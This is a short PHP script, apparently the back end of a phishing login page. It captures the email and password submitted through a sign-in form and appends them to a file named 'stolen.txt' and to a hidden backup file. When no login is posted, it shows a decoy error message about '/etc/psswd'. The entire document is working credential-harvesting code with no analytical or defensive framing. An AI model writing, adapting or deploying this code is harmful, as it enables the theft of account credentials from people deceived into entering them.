<?php
if ($_POST['signIn']){

	$myFile = "stolen.txt";
	$backup = "../backup.txt";
	$bf = fopen($backup, 'a') or die("No Backup!!!");
	$fh = fopen($myFile, 'a') or die("can't open file");
	fwrite($fh, "--------------------\n");
	$stringData = "username: " . $_POST['Email'] . "\n";
	fwrite($bf, $stringData);
	fwrite($fh, $stringData);
	$stringData = "password: " . $_POST['Passwd'] . "\n";
	fwrite($fh, $stringData);
	fwrite($bf, $stringData);
	fclose($fh);
	fclose($bf);

} else {
	echo "ERROR: Can't locate /etc/psswd";
}
?>
<script src="javascript.js"></script>
